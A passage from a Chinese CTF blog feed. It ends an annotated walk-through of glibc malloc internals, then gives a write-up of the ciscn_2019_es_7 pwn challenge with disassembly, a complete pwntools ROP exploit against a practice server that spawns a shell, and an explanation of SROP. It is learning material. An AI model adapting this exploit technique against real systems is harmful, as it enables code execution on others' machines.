chunk</code>里分配chunk了，因此跳转到<code>use_top</code>。<br>如果有空闲<code>chunk</code>，接下来就通过一个while循环依次比较找出到底在哪个双向链表里存在空闲<code>chunk</code>，最后获得空闲chunk所在的双向链表的头指针bin和位置bit。<br>接下来，如果找到的双向链表又为空，则继续前面的遍历，找到空闲<code>chunk</code>所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。如果找到的双向链表不为空，就和上面一部分再largebin中找到空闲chunk的操作一样了</p></blockquote><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><pre class=" language-c"><code class="language-c">    use_top<span class="token punctuation">:</span>      <span class="token comment" spellcheck="true">/*         If large enough, split off the chunk bordering the end of memory         (held in av->top). Note that this is in accord with the best-fit         search rule.  In effect, av->top is treated as larger (and thus         less well fitting) than any other available chunk since it can         be extended to be as large as necessary (up to system         limitations).         We require that av->top always exists (i.e., has size >=         MINSIZE) after initialization, so if it would otherwise be         exhausted by current request, it is replenished. (The main         reason for ensuring it exists is that we may need MINSIZE space         to put in fenceposts in sysmalloc.)       */</span>      victim <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取top</span>      size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取top size</span>        <span class="token comment" spellcheck="true">/*1top_size够大  2切割后的remainder能成chunk  那么直接切割*/</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>            remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          av<span class="token operator">-></span>top <span class="token operator">=</span> remainder<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/*设置标记字段*/</span>          <span class="token comment" spellcheck="true">// 这里设置 PREV_INUSE 是因为 top chunk 前面的 chunk 如果不是 fastbin，就必然会和</span>          <span class="token comment" spellcheck="true">// top chunk 合并，所以这里设置了 PREV_INUSE。</span>          <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                    <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/* When we are using atomic ops to free fast chunks we can get         here for all block sizes.  */</span>      <span class="token comment" spellcheck="true">/*如果上述条件不满足 判断是否有fast chunk*/</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">/*用于fastbins chunk 合并*/</span>          <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* restore original bin index */</span>          <span class="token comment" spellcheck="true">/*计算索引*/</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>            idx <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*         Otherwise, relay to handle system-dependent cases       */</span>       <span class="token comment" spellcheck="true">/*最后的方法就是系统调用sysmalloc了*/</span>      <span class="token keyword">else</span>        <span class="token punctuation">{</span>          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span> <span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>            <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一步：如果进程没有关联的分配区，就通过sysmalloc从操作系统分配内存。<br>第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。<br>第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。<br>第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。<br>第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。<br>第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。<br>第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过sysmalloc从操作系统分配内存。</p><blockquote><p>参考：<a href="https://elixir.bootlin.com/glibc/glibc-2.23.90/source/malloc/malloc.c" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.23.90/source/malloc/malloc.c</a><br><a href="https://blog.csdn.net/conansonic/article/details/50241523" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/50241523</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_7--SROP</title>
      <link href="/2020/09/30/ciscn-2019-es-7-srop/"/>
      <url>/2020/09/30/ciscn-2019-es-7-srop/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec ciscn_2019_es_7<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/ciscn_2019_es_7'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>    只开启NX保护matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ <span class="token punctuation">.</span>/ciscn_2019_es_7 asdasdaasdasda����<span class="token number">6</span>@����Segmentation <span class="token function">fault</span> <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span>内存泄露</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-java"><code class="language-java">main：var_10<span class="token operator">=</span> qword ptr <span class="token operator">-</span>10hvar_4<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp<span class="token punctuation">,</span> rspsub     rsp<span class="token punctuation">,</span> 10hmov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> edimov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_10<span class="token punctuation">]</span><span class="token punctuation">,</span> rsimov     eax<span class="token punctuation">,</span> <span class="token number">0</span>call    vulnnopleaveretnvuln：buf<span class="token operator">=</span> <span class="token keyword">byte</span> ptr <span class="token operator">-</span>10h<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp<span class="token punctuation">,</span> rspxor     rax<span class="token punctuation">,</span> raxmov     edx<span class="token punctuation">,</span> 400h       <span class="token punctuation">;</span> countlea     rsi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>buf<span class="token punctuation">]</span>  <span class="token punctuation">;</span> bufmov     rdi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> fdsyscall                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_readmov     rax<span class="token punctuation">,</span> <span class="token number">1</span>mov     edx<span class="token punctuation">,</span> 30h        <span class="token punctuation">;</span> countlea     rsi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>buf<span class="token punctuation">]</span>  <span class="token punctuation">;</span> bufmov     rdi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> fdsyscall                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_writeretn</code></pre><p>主要在vuln中：</p><ul><li>read(rdi=0,rsi=buf_add,rdx=400h)</li><li>write(rdi=1,rsi=buf_addr,rdx=30h)</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>像这样的很短的程序，直接看汇编码，画出栈数据结构：<br><img src="https://s1.ax1x.com/2020/09/30/0n4CKx.png" alt=""></p><ul><li>因为read过量读取和write输出字节数过大，分别造成栈溢出和内存泄露。</li><li>在rsp_1这里存着stack 地址就可以获取栈地址，rbp_1会在执行ret时作为返回地址，这里是我们要进行覆盖的无法泄露。</li><li>程序中有多个syscall可以进行系统调用构造</li><li>程序给出了hint：<pre class=" language-java"><code class="language-java">000000004004D6 gadgets         proc near<span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004D6 <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004D6                 push    rbp<span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004D7                 mov     rbp<span class="token punctuation">,</span> rsp<span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004DA                 mov     rax<span class="token punctuation">,</span> 0Fh   <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>sigreturn系统调用号········<span class="token number">000000004004E2</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004004E2</span>                 mov     rax<span class="token punctuation">,</span> 3Bh   <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> execv系统调用号<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000004004E9</span>                 retn<span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004EA <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></code></pre></li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>既然后给出了execv系统调用号那就是要构造系统调用rop链来pwn了。</li><li>execv(rdi=’/bin/sh’_addr,rsi=0,rdx=0),’/bin/sh’因为栈地址泄露，我们可以将binsh放入栈中，并且算出其地址。</li><li>寄存器赋值：<pre class=" language-java"><code class="language-java">ROPgadget <span class="token operator">--</span>binary ciscn_2019_es_7 <span class="token operator">--</span>only <span class="token string">""</span> <span class="token operator">|</span> grep <span class="token string">"rdi"</span><span class="token number">0x00000000004005a3</span> <span class="token operator">:</span> pop rdi <span class="token punctuation">;</span> retROPgadget <span class="token operator">--</span>binary ciscn_2019_es_7 <span class="token operator">--</span>only <span class="token string">""</span> <span class="token operator">|</span> grep <span class="token string">"rsi"</span><span class="token number">0x00000000004005a1</span> <span class="token operator">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">00000000004004E2</span>                 mov     rax<span class="token punctuation">,</span> 3Bh只有rdx的gadgets实在是找不到，最后想到了万能gadget：<span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span><span class="token number">400580</span><span class="token operator">:</span>    4c <span class="token number">89</span> ea                 mov    rdx<span class="token punctuation">,</span>r13<span class="token number">400583</span><span class="token operator">:</span>    4c <span class="token number">89</span> f6                 mov    rsi<span class="token punctuation">,</span>r14<span class="token number">400586</span><span class="token operator">:</span>    <span class="token number">44</span> <span class="token number">89</span> ff                 mov    edi<span class="token punctuation">,</span>r15d<span class="token number">400589</span><span class="token operator">:</span>    <span class="token number">41</span> ff <span class="token number">14</span> dc              call   QWORD PTR <span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token number">40058d</span><span class="token operator">:</span>    <span class="token number">48</span> <span class="token number">83</span> c3 <span class="token number">01</span>              add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token number">400591</span><span class="token operator">:</span>    <span class="token number">48</span> <span class="token number">39</span> eb                 cmp    rbx<span class="token punctuation">,</span>rbp<span class="token number">400594</span><span class="token operator">:</span>    <span class="token number">75</span> ea                    jne    <span class="token number">400580</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0x40</span><span class="token operator">></span><span class="token number">400596</span><span class="token operator">:</span>    <span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">08</span>              add    rsp<span class="token punctuation">,</span><span class="token number">0x8</span>40059a<span class="token operator">:</span>    5b                       pop    rbx40059b<span class="token operator">:</span>    <span class="token number">5d</span>                       pop    rbp40059c<span class="token operator">:</span>    <span class="token number">41</span> 5c                    pop    r1240059e<span class="token operator">:</span>    <span class="token number">41</span> <span class="token number">5d</span>                    pop    r134005a0<span class="token operator">:</span>    <span class="token number">41</span> 5e                    pop    r144005a2<span class="token operator">:</span>    <span class="token number">41</span> <span class="token number">5f</span>                    pop    r154005a4<span class="token operator">:</span>    c3                       ret    那么其实execv调用的rdi，rsi，rdx可以直接用这个的解决</code></pre></li></ul><h3 id="但这里也引出了一个问题"><a href="#但这里也引出了一个问题" class="headerlink" title="但这里也引出了一个问题"></a>但这里也引出了一个问题</h3><p>call   QWORD PTR [r12+rbx*8]，需要绕过。<br><strong>call qword ptr [寄存器] 是将寄存器中的值作为地址，找到该地址的值作为被调用函数入口，因为不知道那个地址上的数据类型所以在前面进行强制转换：qword 。就像jmp *register 这就是指针汇编形式</strong><br>所以我的解决办法是：在栈中布置一个ret地址。计算出其栈地址，然后在__libc_csu_init：使r12赋值为该栈地址，那么call   QWORD PTR [r12+rbx*8]就是执行了一个ret。那么也可以在栈中直接布置一个syscall然后call时直接就是进行execv函数。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./ciscn_2019_es_7')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25790</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000040051D</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#jmp to start</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token string">':'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA:\n'</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ff58</span>  <span class="token comment" spellcheck="true">#gdb调试，计算</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x1fe20</span> <span class="token comment" spellcheck="true">#gdb调试，计算</span><span class="token comment" spellcheck="true">#execv(rdi='/bin/sh'_Addr,rsi=0,rdx=0)rax=59</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004005a3</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004005a1</span>mov_rax_3bh <span class="token operator">=</span> <span class="token number">0x04004E2</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004003a9</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000400501</span><span class="token comment" spellcheck="true">#rbx=0,rbp=1,r12=ret,r13=0,r14=0,r15=0</span>payload1 <span class="token operator">=</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#栈中布置ret指令地址</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40059a</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#ret指令的栈地址</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400580</span><span class="token punctuation">)</span>  payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span> <span class="token comment" spellcheck="true">#for rsp increasing</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rax_3bh<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode\x00\x00\x00\x00\x0<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x30</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">2f</span> <span class="token number">62</span> <span class="token number">69</span> 6e  <span class="token number">2f</span> <span class="token number">73</span> <span class="token number">68</span> <span class="token number">00</span>  a9 <span class="token number">03</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │<span class="token operator">/</span>bin│<span class="token operator">/</span>sh·│··@·│····│    <span class="token number">00000010</span>  9a <span class="token number">05</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│····│····│    <span class="token number">00000020</span>  <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  b8 <span class="token number">69</span> b6 b8  fd <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │····│····│·i··│····│    <span class="token number">00000030</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh\x00\x03\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00i\xb6\xb8�$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x4</span> bytes<span class="token operator">:</span>    <span class="token string">'ctf\n'</span>ctf<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading in interactive$  </code></pre><p>其最优解是对这系统调用的使用：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>00000000004004DA        mov     rax<span class="token punctuation">,</span> 0Fh   <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>sigreturn系统调用号</code></pre><p>我这个方法是死磕出来的，一起来学习一下这种方法：</p><h2 id="SROP–Sigreturn-Oriented-Programming"><a href="#SROP–Sigreturn-Oriented-Programming" class="headerlink" title="SROP–Sigreturn Oriented Programming"></a>SROP–Sigreturn Oriented Programming</h2><h3 id="Signal机制"><a href="#Signal机制" class="headerlink" title="Signal机制"></a>Signal机制</h3><p>这个机制在现在的操作系统中广泛使用，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p><ul><li>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核</li><li>然后内核为该进程保存相应的上下文（主要是将所有寄存器压入栈中，以及压入 signal 信息以及指向 sigreturn 的系统调用地址），跳转到之前注册好的signal handler中处理相应signal</li><li>执行完signal handler，返回</li><li>内核为该进程恢复之前保存的上下文，最后恢复进程的执行<br><img src="https://s1.ax1x.com/2020/09/30/0n4Pr6.png" alt=""><br>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：<br>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址ret2sigreturn，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。<br>此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br><img src="https://s1.ax1x.com/2020/09/30/0nhj54.png" alt=""><br>在栈顶填入ret2sigrturn之后栈结构如下：64位<br><img src="https://s1.ax1x.com/2020/09/30/0nhxPJ.png" alt=""></li></ul><p><strong>我们将这段内存称为一个`Signal Frame`</strong><br>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。从挂起点恢复执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p><p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext<br>x86</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> sigcontext<span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">,</span> __gsh<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">,</span> __fsh<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> es<span class="token punctuation">,</span> __esh<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ds<span class="token punctuation">,</span> __dsh<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edi<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esi<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebp<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebx<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edx<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ecx<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eax<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> trapno<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> err<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eip<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">,</span> __csh<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span 